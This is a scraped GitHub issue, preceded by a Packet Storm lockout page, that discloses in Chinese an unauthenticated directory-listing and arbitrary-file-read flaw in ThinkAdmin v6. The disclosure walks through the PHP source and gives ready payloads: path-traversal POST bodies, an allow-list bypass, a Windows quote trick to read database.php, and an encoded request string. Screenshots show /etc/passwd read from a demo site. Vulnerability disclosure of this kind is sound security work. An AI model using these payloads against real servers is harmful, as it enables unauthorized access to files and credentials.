=== Content from packetstormsecurity.com_0295de93_20250119_121217.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from github.com_e69b9dea_20250119_121218.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzoujingli%2FThinkAdmin%2Fissues%2F244)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzoujingli%2FThinkAdmin%2Fissues%2F244)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=zoujingli%2FThinkAdmin)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zoujingli](/zoujingli)
/
**[ThinkAdmin](/zoujingli/ThinkAdmin)**
Public

* [Notifications](/login?return_to=%2Fzoujingli%2FThinkAdmin) You must be signed in to change notification settings
* [Fork
  840](/login?return_to=%2Fzoujingli%2FThinkAdmin)
* [Star
   2.2k](/login?return_to=%2Fzoujingli%2FThinkAdmin)

* [Code](/zoujingli/ThinkAdmin)
* [Issues
  10](/zoujingli/ThinkAdmin/issues)
* [Pull requests
  1](/zoujingli/ThinkAdmin/pulls)
* [Actions](/zoujingli/ThinkAdmin/actions)
* [Projects
  0](/zoujingli/ThinkAdmin/projects)
* [Security](/zoujingli/ThinkAdmin/security)
* [Insights](/zoujingli/ThinkAdmin/pulse)

Additional navigation options

* [Code](/zoujingli/ThinkAdmin)
* [Issues](/zoujingli/ThinkAdmin/issues)
* [Pull requests](/zoujingli/ThinkAdmin/pulls)
* [Actions](/zoujingli/ThinkAdmin/actions)
* [Projects](/zoujingli/ThinkAdmin/projects)
* [Security](/zoujingli/ThinkAdmin/security)
* [Insights](/zoujingli/ThinkAdmin/pulse)

# ThinkAdmin v6 未授权列目录/任意文件读取 #244

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[ThinkAdmin v6 未授权列目录/任意文件读取](#top)#244Copy linkLabels[bug](https://github.com/zoujingli/ThinkAdmin/issues?q=state%3Aopen%20label%3A%22bug%22)![@Hzllaga](https://avatars.githubusercontent.com/u/40329078?u=92c1d51200b370e295f7b1074cc1e04614a81609&v=4&size=80)
## Description

![@Hzllaga](https://avatars.githubusercontent.com/u/40329078?u=92c1d51200b370e295f7b1074cc1e04614a81609&v=4&size=48)[Hzllaga](https://github.com/Hzllaga)opened [on Aug 27, 2020](https://github.com/zoujingli/ThinkAdmin/issues/244#issue-687050255)
# ThinkAdmin v6 列目录/任意文件读取

`app/admin/controller/api/Update.php`存在3个function，都是不用登录认证就可以使用的，引用列表如下：

```
namespace app\admin\controller\api;

use think\admin\Controller;
use think\admin\service\InstallService;
use think\admin\service\ModuleService;
```

`version()`可以获取到当前版本：`2020.08.03.01`，≤这个版本的都有可能存在漏洞

URL：<http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version>

## 列目录

`node()`：

```
/**
* 读取文件列表
*/
public function node()
{
    $this->success('获取文件列表成功！', InstallService::instance()->getList(
        json_decode($this->request->post('rules', '[]', ''), true),
        json_decode($this->request->post('ignore', '[]', ''), true)
    ));
}
```

直接把POST的`rules`和`ignore`参数传给`InstallService::instance()->getList()`，根据上面的use引用可以知道文件路径在`vendor/zoujingli/think-library/src/service/InstallService.php`：

```
/**
 * 获取文件信息列表
 * @param array $rules 文件规则
 * @param array $ignore 忽略规则
 * @param array $data 扫描结果列表
 * @return array
 */
public function getList(array $rules, array $ignore = [], array $data = []): array
{
    // 扫描规则文件
    foreach ($rules as $key => $rule) {
        $name = strtr(trim($rule, '\\/'), '\\', '/');
        $data = array_merge($data, $this->_scanList($this->root . $name));
    }
    // 清除忽略文件
    foreach ($data as $key => $item) foreach ($ignore as $ign) {
        if (stripos($item['name'], $ign) === 0) unset($data[$key]);
    }
    // 返回文件数据
    return ['rules' => $rules, 'ignore' => $ignore, 'list' => $data];
}
```

`$ignore`可以不用关注，他会透过`_scanList()`去遍历`$rules`数组，调用`scanDirectory()`去递归遍历目录下的文件，最后在透过`_getInfo()`去获取文件名与哈希，由下面代码可以知道程序没有任何验证，攻击者可以在未授权的情况下读取服务器的文件列表。

```
/**
 * 获取目录文件列表
 * @param string $path 待扫描目录
 * @param array $data 扫描结果
 * @return array
 */
private function _scanList($path, $data = []): array
{
    foreach (NodeService::instance()->scanDirectory($path, [], null) as $file) {
        $data[] = $this->_getInfo(strtr($file, '\\', '/'));
    }
    return $data;
}
```

```
/**
 * 获取所有PHP文件列表
 * @param string $path 扫描目录
 * @param array $data 额外数据
 * @param string $ext 文件后缀
 * @return array
 */
public function scanDirectory($path, $data = [], $ext = 'php')
{
    if (file_exists($path)) if (is_file($path)) $data[] = $path;
    elseif (is_dir($path)) foreach (scandir($path) as $item) if ($item[0] !== '.') {
        $realpath = rtrim($path, '\\/') . DIRECTORY_SEPARATOR . $item;
        if (is_readable($realpath)) if (is_dir($realpath)) {
            $data = $this->scanDirectory($realpath, $data, $ext);
        } elseif (is_file($realpath) && (is_null($ext) || pathinfo($realpath, 4) === $ext)) {
            $data[] = strtr($realpath, '\\', '/');
        }
    }
    return $data;
}
```

```
/**
 * 获取指定文件信息
 * @param string $path 文件路径
 * @return array
 */
private function _getInfo($path): array
{
    return [
        'name' => str_replace($this->root, '', $path),
        'hash' => md5(preg_replace('/\s+/', '', file_get_contents($path))),
    ];
}
```

读取网站根目录Payload: <http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node>

POST:

```
rules=["/"]

```

也可以使用`../`来进行目录穿越

```
rules=["../../../"]

```

演示站：

[![圖片](https://user-images.githubusercontent.com/40329078/91416267-b7c83d00-e881-11ea-9ff4-aced0fbb3c0b.png)](https://user-images.githubusercontent.com/40329078/91416267-b7c83d00-e881-11ea-9ff4-aced0fbb3c0b.png)

## 任意文件读取

`get()`：

```
/**
 * 读取文件内容
 */
public function get()
{
    $filename = decode(input('encode', '0'));
    if (!ModuleService::instance()->checkAllowDownload($filename)) {
        $this->error('下载的文件不在认证规则中！');
    }
    if (file_exists($realname = $this->app->getRootPath() . $filename)) {
        $this->success('读取文件内容成功！', [
            'content' => base64_encode(file_get_contents($realname)),
        ]);
    } else {
        $this->error('读取文件内容失败！');
    }
}
```

首先从GET读取`encode`参数并使用`decode()`解码：

```
/**
 * 解密 UTF8 字符串
 * @param string $content
 * @return string
 */
function decode($content)
{
    $chars = '';
    foreach (str_split($content, 2) as $char) {
        $chars .= chr(intval(base_convert($char, 36, 10)));
    }
    return iconv('GBK//TRANSLIT', 'UTF-8', $chars);
}
```

解密UTF8字符串的，刚好上面有个加密UTF8字符串的`encode()`，攻击时直接调用那个就可以了：

```
/**
 * 加密 UTF8 字符串
 * @param string $content
 * @return string
 */
function encode($content)
{
    [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))];
    for ($i = 0; $i < $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
    return $chars;
}
```

跟进`ModuleService::instance()->checkAllowDownload()`，文件路径`vendor/zoujingli/think-library/src/service/ModuleService.php`：

```
/**
 * 检查文件是否可下载
 * @param string $name 文件名称
 * @return boolean
 */
public function checkAllowDownload($name): bool
{
    // 禁止下载数据库配置文件
    if (stripos($name, 'database.php') !== false) {
        return false;
    }
    // 检查允许下载的文件规则
    foreach ($this->getAllowDownloadRule() as $rule) {
        if (stripos($name, $rule) !== false) return true;
    }
    // 不在允许下载的文件规则
    return false;
}
```

首先`$name`不能够是`database.php`，接着跟进`getAllowDownloadRule()`：

```
/**
 * 获取允许下载的规则
 * @return array
 */
public function getAllowDownloadRule(): array
{
    $data = $this->app->cache->get('moduleAllowRule', []);
    if (is_array($data) && count($data) > 0) return $data;
    $data = ['config', 'public/static', 'public/router.php', 'public/index.php'];
    foreach (array_keys($this->getModules()) as $name) $data[] = "app/{$name}";
    $this->app->cache->set('moduleAllowRule', $data, 30);
    return $data;
}
```

有一个允许的列表：

```
config
public/static
public/router.php
public/index.php
app/admin
app/wechat

```

也就是说`$name`必须要不是`database.php`且要在允许列表内的文件才能够被读取，先绕过安全列表的限制，比如读取根目录的1.txt，只需要传入：

```
public/static/../../1.txt

```

而`database.php`的限制在Linux下应该是没办法绕过的，但是在Windows下可以透过`"`来替换`.`，也就是传入：

```
public/static/../../config/database"php

```

对应encode()后的结果为：

```
34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34
```

Windows读取`database.php`：

[![圖片](https://user-images.githubusercontent.com/40329078/91416320-cf072a80-e881-11ea-8b32-b6be62ed3b49.png)](https://user-images.githubusercontent.com/40329078/91416320-cf072a80-e881-11ea-8b32-b6be62ed3b49.png)

演示站读取`/etc/passwd`：

[![圖片](https://user-images.githubusercontent.com/40329078/91416357-d8909280-e881-11ea-92ec-17be84abc6b7.png)](https://user-images.githubusercontent.com/40329078/91416357-d8909280-e881-11ea-92ec-17be84abc6b7.png)

v5连允许列表都没有，可以直接读任意文件。

## Metadata

### Assignees

No one assigned

### Labels

[bug](https://github.com/zoujingli/ThinkAdmin/issues?q=state%3Aopen%20label%3A%22bug%22)
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


